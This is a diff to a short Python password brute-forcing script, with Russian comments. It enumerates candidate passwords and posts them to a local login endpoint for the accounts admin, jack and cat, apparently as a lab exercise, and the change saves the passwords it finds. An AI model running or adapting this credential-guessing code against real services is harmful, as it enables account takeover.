@@ -1,8 +1,9 @@
 import requests
 from string import ascii_letters as alphabet
+import time
 
 state = 0
-alphabet = '*' + ''.join((str(i) for i in range(10))) + alphabet                # включая буквы в верхнем регистре
+alphabet = '*' + ''.join((str(i) for i in range(10))) + alphabet    # включая буквы в верхнем регистре
                                                                                 # для увеличения скорости перебора можно заменить на .ascii_lowercase
 def to_alphabet(n):
     base = len(alphabet)
@@ -29,14 +30,19 @@ def start_bruteforce(login, pass_pattern):
         response = requests.post('http://127.0.0.1:5000/auth', json=data)
         if response.status_code == 200:
             print('Password %s for %s Found!' % (password, login))
+            global state
+            state = 0
+            pass_list.append(password)
+            time.sleep(1)
             break
         else:
             # print(f'{password=} is incorrect')
-            pass                                          # раскомментировать строку выше для наблюдения процесса
+            pass                                        # раскомментировать строку выше для наблюдения процесса
+
 
 if __name__ == '__main__':
-    login_list = ['admin', 'jack', 'cat']
     pass_list = []
+    login_list = ['admin', 'jack', 'cat']
     for login in login_list:
         password = ''
         start_bruteforce(login, password)
